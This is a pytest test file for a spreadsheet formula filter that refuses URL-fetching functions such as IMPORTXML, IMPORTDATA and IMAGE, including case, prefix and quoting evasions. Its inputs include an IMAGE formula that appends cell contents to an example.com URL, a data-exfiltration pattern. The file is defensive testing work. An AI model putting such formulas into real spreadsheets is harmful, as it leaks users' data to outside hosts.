import pytest
from sheets_mcp.errors import SheetsError
from sheets_mcp.formulas import refuse_url_functions


@pytest.mark.parametrize('value', [
    '=IMPORTXML("https://example.com", "//a")',
    '=importdata(A1)',
    '=IF(A1, IMAGE("https://example.com/p?" & B2), "")',
    '= ImportRange ("1AbC", "Data!A1")',
    '+IMPORTXML("https://example.com", "//a")',
    ' -IMPORTDATA(A1)',
    '=_xlfn.IMPORTDATA(A1)',
    '=\'a"b\'!A1&IMPORTDATA(Z1)&\'a"b\'!A1',
    ])
def test_refuses_url_functions(value):
    """Verify a formula calling a URL-fetching function is refused, in any
    case, nested, or with a space before the parenthesis.

    Mutation: a case-sensitive match, only '=' counted as a formula start,
    or a quoted tab name holding '"' read as a string literal.
    Oracle: each value calls one of the six refused functions.
    """
    with pytest.raises(SheetsError):
        refuse_url_functions(value)


@pytest.mark.parametrize('value', [
    '=SUM(A1:A3)',
    '="IMPORTXML(is only text)"',
    '=MYIMAGE(A1)',
    'IMPORTXML(A1)',
    42,
    None,
    ])
def test_passes_other_values(value):
    """Verify a name inside a string literal, a longer name ending in a
    refused one, and text that is not a formula all pass.

    Mutation: dropping the string-literal strip, or dropping the guard
    before the name.
    Oracle: none of these values calls a refused function.
    """
    refuse_url_functions(value)
